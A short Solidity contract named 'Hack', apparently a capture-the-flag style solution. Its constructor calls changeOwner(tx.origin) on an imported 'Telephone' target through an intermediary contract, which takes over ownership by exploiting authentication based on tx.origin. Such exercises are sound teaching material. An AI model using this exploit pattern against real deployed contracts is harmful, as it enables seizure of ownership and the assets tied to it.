
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Hack{
    constructor(address _target){
       Telephone(_target).changeOwner(tx.origin);
    }
}